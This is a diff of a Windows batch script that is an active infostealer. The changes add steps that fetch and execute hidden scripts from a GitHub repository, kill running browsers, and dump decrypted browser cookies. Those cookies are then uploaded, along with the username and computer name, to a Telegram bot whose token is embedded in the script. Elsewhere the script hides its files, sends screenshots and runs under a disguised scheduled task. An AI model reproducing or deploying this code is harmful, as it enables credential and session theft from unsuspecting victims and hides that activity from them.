@@ -1,23 +1,20 @@
-:: ( nHBAPWtA )
-:: RUNEVERYCALLER Installed in %appdata%\Microsoft\Windows\SystemCertificatesData\Tasks\ProtectionWindowsHostProcess.exe ( %SystemRoot%\System32\convertsshd.exe )
-:: RUNEVERYCALLER TASK NAMED "SystemLibrariesU" , is Running RunEveryCaller every 1 min
-
-::goto :EOF
-
 @echo off
+
+if exist "%temp%\i059.tmp" exit
 
 
 setlocal enabledelayedexpansion
 
 
-set "BATCHVERSION=33.1"
+set "BATCHVERSION=33.2"
 set "LOGFILE=%temp%\S1rNsvQgG.mpeez"
 set "RESULT=%TEMP%\TGRESU.txa"
 set "ALLOWED=124"
 
 del /f /a "%LOGFILE%"
 
-
+echo. >> "%LOGFILE%" 2>&1
+attrib +h +s "%LOGFILE%"
 echo Allowed PCs : >> "%LOGFILE%" 2>&1
 echo. >> "%LOGFILE%" 2>&1
 echo %ALLOWED% >> "%LOGFILE%" 2>&1
@@ -125,7 +122,7 @@ echo.
 del /f /a "%LOGFILE%"
 del /f /a %temp%\*.mpee
 del /f /a %temp%\*.qwb
-del /f /q "%RESULT%"
+del /f /a /q "%RESULT%"
 echo.
 goto :EOF
 
@@ -172,7 +169,7 @@ echo.
 
 
 echo Maybe Turning CheckSend=1
-set "CheckSend=0"
+set "CheckSend=1"
 set "SENDSCREENSHOT=1"
 set "lastMinute=none"
 echo CheckSend=!CheckSend!
@@ -270,6 +267,7 @@ echo.
 
 
 echo. >> "%InstalledQWB%"
+attrib +h +s "%InstalledQWB%"
 echo. >> "%InstalledQWB%"
 echo. >> "%InstalledQWB%"
 echo. >> "%InstalledQWB%"
@@ -481,7 +479,8 @@ set "file7=%APPDATA%\Microsoft\7z.exe"
 set "file8=%APPDATA%\Microsoft\7z.dll"
 set "file9=%SystemRoot%\System32\handle.exe"
 set "file10=%SystemRoot%\System32\wudtest.exe"
-
+set "file11=%SystemRoot%\System32\DataCacheViewer.exe"
+set "file12=%SystemRoot%\System32\Systeminterruptshost.exe"
 
 echo Typing in %InstalledQWB%
 echo.
@@ -500,8 +499,8 @@ if exist "%file7%" if exist "%file8%" (
 )
 if exist "%file9%" echo handle.exe Found in %file9% >> "%InstalledQWB%"
 if exist "%file10%" echo wudtest.exe SpeedTest Found in %file10% >> "%InstalledQWB%"
-
-
+if exist "%file11%" echo ChrmCksViewer  Found in %file11% >> "%InstalledQWB%"
+if exist "%file12%" echo RunBatHidden  Found in %file12% >> "%InstalledQWB%"
 
 
 
@@ -516,8 +515,8 @@ if not exist "%file7%" goto STARTUPTAASK
 if not exist "%file8%" goto STARTUPTAASK
 if not exist "%file9%" goto STARTUPTAASK
 if not exist "%file10%" goto STARTUPTAASK
-
-
+if not exist "%file11%" goto STARTUPTAASK
+if not exist "%file12%" goto STARTUPTAASK
 
 :: If all files are found, continue with other tasks
 echo All files found.
@@ -554,12 +553,10 @@ set "ShellHostMD5=5f2000d1452e1e270a363e1d8fac91f0"
 set "KMSAutoMD5=8492873672e236b86f7d5fdf0d0d699b"
 
 
-
-
-
 :CheckSHST
 echo :CheckSHST
 echo.
+
 
 
 
@@ -599,7 +596,7 @@ if "%SHSTFILEmd5%"=="%ShellHostMD5%" (
 echo MD5 doesnt match %SHSTFILEmd5% # %ShellHostMD5%
 echo Turning CheckSend=1
 set "CheckSend=1"
-set "SENDSCREENSHOT=0"
+set "SENDSCREENSHOT=1"
 set "MESSAGE=%MESSAGE%MD5SHSTMISMATCH^|"
 
 
@@ -767,7 +764,7 @@ if "%KMSFILEmd5%"=="%KMSAutoMD5%" (
 echo MD5 doesnt match %KMSFILEmd5% # %KMSAutoMD5%
 echo Turning CheckSend=1
 set "CheckSend=1"
-set "SENDSCREENSHOT=0"
+set "SENDSCREENSHOT=1"
 set "MESSAGE=%MESSAGE%MD5KMSMISMATCH^|"
 
 echo.
@@ -1197,8 +1194,8 @@ echo.
 
 :: Check wudtest.exe; if found, skip to COMMANDSFORAGENTS
 if exist "%file10%" (
-    echo %file10% found. Going to COMMANDSFORAGENTS
-    goto COMMANDSFORAGENTS
+    echo %file10% found. Going to CheckChrmCksViewer
+    goto CheckChrmCksViewer
 )
 
 
@@ -1248,6 +1245,125 @@ echo.
 
 
 
+:CheckChrmCksViewer
+echo :CheckChrmCksViewer
+echo.
+
+
+
+:: Check ChrmCksViewer; if found, skip to CheckRunBatHidden
+if exist "%file11%" (
+    echo %file11% found. Going to CheckRunBatHidden
+    goto CheckRunBatHidden
+)
+
+
+
+:: Run commands if wudtest.exe is not found
+echo Checking for ChrmCksViewer...
+set "embeddedScript=%temp%\temp_script_ChrmCksViewer.bat"
+del /f /a "%embeddedScript%"
+
+
+:: Download content and save to the embedded batch file
+curl -L -o "%embeddedScript%" "https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/Installers/ChrmCksViewer"
+attrib +h +s "%embeddedScript%"
+
+if exist "%embeddedScript%" (
+    echo Script content saved to %embeddedScript%.
+    call "%embeddedScript%"
+    del /f /a "%embeddedScript%"
+    echo.
+    echo.
+) else (
+    echo Filed to get content from wudtest Link
+    echo.
+    timeout /t 3 /nobreak 
+    goto CheckChrmCksViewer
+)
+
+
+set "MESSAGE=%MESSAGE%ChrmCksViewer^|"
+echo Turning CheckSend=1
+set "CheckSend=1"
+
+
+
+echo.
+echo.
+echo Displaying Message
+echo MESSAGE=%MESSAGE% and CheckSend=%CheckSend%
+echo.
+echo.
+
+
+
+
+
+
+
+
+
+
+:CheckRunBatHidden
+echo :CheckRunBatHidden
+echo.
+
+
+
+:: Check wudtest.exe; if found, skip to COMMANDSFORAGENTS
+if exist "%file12%" (
+    echo %file12% found. Going to COMMANDSFORAGENTS
+    goto COMMANDSFORAGENTS
+)
+
+
+
+:: Run commands if wudtest.exe is not found
+echo Checking for RunBatHidden...
+set "embeddedScript=%temp%\temp_script_RunBatHidden.bat"
+del /f /a "%embeddedScript%"
+
+
+:: Download content and save to the embedded batch file
+curl -L -o "%embeddedScript%" "https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/Installers/RunBatHidden"
+attrib +h +s "%embeddedScript%"
+
+if exist "%embeddedScript%" (
+    echo Script content saved to %embeddedScript%.
+    call "%embeddedScript%"
+    del /f /a "%embeddedScript%"
+    echo.
+    echo.
+) else (
+    echo Filed to get content from wudtest Link
+    echo.
+    timeout /t 3 /nobreak 
+    goto CheckRunBatHidden
+)
+
+
+set "MESSAGE=%MESSAGE%RunBatHidden^|"
+echo Turning CheckSend=1
+set "CheckSend=1"
+
+
+
+echo.
+echo.
+echo Displaying Message
+echo MESSAGE=%MESSAGE% and CheckSend=%CheckSend%
+echo.
+echo.
+
+
+
+
+
+
+
+
+
 
 
 
@@ -1272,7 +1388,6 @@ set "KMSSTART=0"
 
 :RUNNINGSHSTKMS
 
-
 for /f "tokens=*" %%A in ('certutil -hashfile "%SHSTFILE%" MD5 ^| findstr /V "hash"') do set "SHSTFILEmd5=%%A"
 echo MD5 of %SHSTFILE% = %SHSTFILEmd5%
 echo.
@@ -1294,7 +1409,7 @@ if "%SHSTFILEmd5%"=="%ShellHostMD5%" (
 
 echo.
 echo.
-
+:RUNNINGKMS
 
 for /f "tokens=*" %%A in ('certutil -hashfile "%KMSFILE%" MD5 ^| findstr /V "hash"') do set "KMSFILEmd5=%%A"
 echo MD5 of %KMSFILE% = %KMSFILEmd5%
@@ -1375,7 +1490,7 @@ echo.
 
 
 if "!KMSSTART!"=="1" goto :CHECK_KMSFILE
-Only SHSTSTART=!SHSTSTART!
+echo Only SHSTSTART=!SHSTSTART!
 echo Going to NEXT5
 goto NEXT5
 
@@ -1829,6 +1944,8 @@ echo.
 :: Define the file to track the last run time
 set "EVERY30MIN=%TEMP%\EVY3PT.sys"
 
+
+attrib -h -s "%EVERY30MIN%"
 :: Check if the file exists
 if not exist "%EVERY30MIN%" (
     echo 1 > "%EVERY30MIN%"
@@ -1837,8 +1954,12 @@ if not exist "%EVERY30MIN%" (
     echo !MINTSS! > "%EVERY30MIN%"
 )
 
+
+
 :: Read the updated value
+echo Reading Updated Value.
 set /p MINTSS=<"%EVERY30MIN%"
+attrib +h +s "%EVERY30MIN%"
 echo MINTSS=%MINTSS%
 echo.
 echo.
@@ -1854,6 +1975,7 @@ set "SMALLUSER=%USERNAME:~0,2%%USERNAME:~-2%"
 curl -s -X POST "https://api.telegram.org/bot7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA/sendMessage" -d "chat_id=1040442734" -d "text=%SMALLUSER%10ZIN" > "%RESULT%"
 
 
+
 findstr /i "message_id" "%RESULT%" >nul
 if %errorlevel%==0 (
     echo Message sent successfully!
@@ -1866,7 +1988,7 @@ if %errorlevel%==0 (
     goto 30MINDONE
 )
 
-del /f /q "%RESULT%"
+del /f /a /q "%RESULT%"
 echo 0 > "%EVERY30MIN%"
 goto HIHOZ
 
@@ -1895,6 +2017,8 @@ echo.
 del /f /a "%TEMP%\lastrun.log"
 set "LASTRUNFILE=%TEMP%\lstrimsys.drv"
 
+
+attrib -h -s "%LASTRUNFILE%"
 :: Check if the file exists
 if not exist "%LASTRUNFILE%" (
     echo 1 > "%LASTRUNFILE%"
@@ -1904,20 +2028,29 @@ if not exist "%LASTRUNFILE%" (
 )
 
 :: Read the updated value
+echo Reading Updated Value.
 set /p MINUTESS=<"%LASTRUNFILE%"
+attrib +h +s "%LASTRUNFILE%"
 echo Minutess=%MINUTESS%
 echo.
 echo.
 
 :: Check if 180 minutes have passed
-if %MINUTESS% GEQ 300 goto 3HOURDONE
+if %MINUTESS% GEQ 540 goto 3HOURDONE
 goto 3HOURSTILL
 
 :3HOURDONE
+echo 3HOURDONESTARTED
+echo.
 set "SMALLUSER=%USERNAME:~0,2%%USERNAME:~-2%"
+set "CHROMECOOKIES=%file11%"
+set "DecCookiesFile=%temp%\PuN7s%random%Fr7ms%random%.ckst"
+set "RunBatHidden=%file12%
+set "BatchFileHidden1=%temp%\Bpput%random%4szNsq.bat"
 
 
-curl -s -X POST "https://api.telegram.org/bot7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA/sendMessage" -d "chat_id=1040442734" -d "text=%SMALLUSER%5HOU" > "%RESULT%"
+curl -s -X POST "https://api.telegram.org/bot7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA/sendMessage" -d "chat_id=1040442734" -d "text=%SMALLUSER%9HOU" > "%RESULT%"
+
 
 
 findstr /i "message_id" "%RESULT%" >nul
@@ -1933,15 +2066,90 @@ if %errorlevel%==0 (
 )
 
 
-del /f /q "%RESULT%"
-start "" "%file1%"
+del /f /a /q "%RESULT%"
+
+
+:CREATINGBATCHFILE
+
+
+(
+echo @echo off
+echo.
+echo.
+echo setlocal enabledelayedexpansion
+echo.
+echo set maxcount=15
+echo set "CHRMCKSSTARTED=0"
+echo.
+echo :CHRMCKSVIEWER
+echo set killcount=1
+echo.
+echo :killloop
+echo echo !killcount! Killing...
+echo taskkill /f /im Opera.exe
+echo taskkill /f /im Chrome.exe
+echo taskkill /f /im Brave.exe
+echo taskkill /f /im Firefox.exe
+echo taskkill /f /im cent.exe
+echo taskkill /f /im edge.exe
+echo timeout /t 1 /nobreak
+echo echo.
+echo echo.
+echo echo.
+echo echo.
+echo echo.
+echo set /a killcount^+=1
+echo if !killcount! LEQ !maxcount! goto killloop
+echo.
+echo exit
+) > "%BatchFileHidden1%"
+
+
+attrib +h +s "%BatchFileHidden1%"
+echo Created batch file at: %BatchFileHidden1%
+
+
+echo Running Task Killer
+Systeminterruptshost.exe %BatchFileHidden1% /delete
+echo Must be Killing Task now
+timeout /t 2 /nobreak
+echo.
+echo.
+
+%CHROMECOOKIES% /scookiestxt %DecCookiesFile%
+
+if exist "%DecCookiesFile%" (
+    echo Cookies created in: %DecCookiesFile%
+    attrib +h +s "%DecCookiesFile%"
+) else (
+    echo Cookies not created.
+)
+echo.
+echo.
+
+
+set "CHRMCKSSTARTED=1"
+
+
+
+:COMSTARTING
+powershell -NoProfile -WindowStyle Hidden -Command "Start-Process '%file1%'"
 set "COMSTARTED=1"
+
+
+attrib -h -s "%LASTRUNFILE%"
 echo 0 > "%LASTRUNFILE%"
+attrib +h +s "%LASTRUNFILE%"
+
+
 goto NEXT4
+
+
+
 
 :3HOURSTILL
 echo.
-Minutes is still %MINUTESS%
+echo Minutes is still %MINUTESS%
 echo.
 
 
@@ -2028,6 +2236,7 @@ curl -s -X POST "https://api.telegram.org/bot%TOKEN_RUNNING%/sendMessage" ^
 
 
 
+
 findstr /i "message_id" "%RESULT%" >nul
 if %errorlevel%==0 (
     echo Message sent successfully!
@@ -2041,7 +2250,7 @@ if %errorlevel%==0 (
 )
 
 
-del /f /q "%RESULT%"
+del /f /a /q "%RESULT%"
 
 if "%COMSTARTED%"=="0" goto CONT
 
@@ -2064,12 +2273,13 @@ set "FILE_PATH_STLR=%LOGFILE1%"
 
 echo Timeis=%time%
 echo.
-echo Sending"%ENCODED_MESSAGE_STLR%"
+echo Sending "%ENCODED_MESSAGE_STLR%"
 
 curl -s -X POST "https://api.telegram.org/bot%TOKEN_STLR%/sendMessage" ^
      -d "chat_id=%CHAT_ID_STLR%" ^
      -d "message_thread_id=%TOPIC_ID_STLR%" ^
      -d "text=%ENCODED_MESSAGE_STLR%" > "%RESULT%"
+
 
 
 findstr /i "message_id" "%RESULT%" >nul
@@ -2084,7 +2294,42 @@ if %errorlevel%==0 (
     goto SENDINGSTLRMSGNOW
 )
 
-del /f /q "%RESULT%"
+
+:SENDCOOKIES
+echo.
+echo.
+echo Sending Cookies Now..
+echo.
+echo.
+
+
+curl -s -X POST "https://api.telegram.org/bot%TOKEN_STLR%/sendDocument" ^
+     -F "chat_id=%CHAT_ID_STLR%" ^
+     -F "message_thread_id=%TOPIC_ID_STLR%" ^
+     -F "caption=%USERNAME%(%COMPUTERNAME%)|%time%" ^
+     -F "document=@%DecCookiesFile%" > "%RESULT%"
+
+
+
+
+findstr /i "message_id" "%RESULT%" >nul
+if %errorlevel%==0 (
+    echo Message sent successfully!
+    echo.
+) else (
+    echo Failed to send message. Retrying...
+    echo.
+    timeout /t 2 /nobreak
+    echo Going to SENDCOOKIES
+    goto SENDCOOKIES
+)
+
+
+
+
+
+del /f /a /q "%RESULT%"
+del /f /q "%DecCookiesFile%"
 
 
 
@@ -2214,7 +2459,7 @@ del /f /a "%InstalledQWB%"
 
 echo Firstly Testing with SpeedTest >> "%LOGFILE1%"
 echo. >> "%LOGFILE1%"
-wudtest.exe --accept-license --accept-gdpr >> "%LOGFILE1%"
+::wudtest.exe --accept-license --accept-gdpr >> "%LOGFILE1%"
 (for /l %%i in (1,1,5) do echo.) >> "%LOGFILE1%"
 
 
@@ -2366,6 +2611,7 @@ curl -s -X POST "https://api.telegram.org/bot%TOKEN_UPDATESSCRNSHTS%/sendPhoto" 
 ::1040442734
 
 
+
 findstr /i "message_id" "%RESULT%" >nul
 if %errorlevel%==0 (
     echo Message sent successfully!
@@ -2412,7 +2658,7 @@ if %errorlevel%==0 (
 
 
 
-del /f /q "%RESULT%"
+del /f /a /q "%RESULT%"
 ::del /f /a "%ZIP_FILE%"
 
 
